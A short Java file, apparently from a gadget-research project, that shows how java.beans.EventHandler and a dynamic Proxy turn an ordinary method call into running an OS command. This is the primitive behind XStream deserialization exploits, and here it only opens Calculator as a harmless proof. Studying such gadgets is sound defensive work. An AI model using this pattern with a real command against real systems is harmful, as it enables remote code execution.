package com.sec.exploits.XStream;

import java.beans.EventHandler;
import java.lang.reflect.Proxy;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-07-27 15:44
 **/


public class Person {
    private String name;
    private int age;

    public Person(String name,int age){
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }

    public static void main(String[] args) {
        HelloService hello = new HelloImpl();
        EventHandler start = new EventHandler(new ProcessBuilder("open","/Applications/Calculator.app"), "start", null, null);
        HelloService o = (HelloService)Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), start);
        o.goodMorning();

    }
}

interface HelloService {
    void goodMorning();
    void goodEvening();
}

class HelloImpl implements HelloService {
    @Override
    public void goodMorning() {
        System.out.println("Good Morning!");
    }

    @Override
    public void goodEvening() {
        System.out.println("Good Evening!");
    }
}

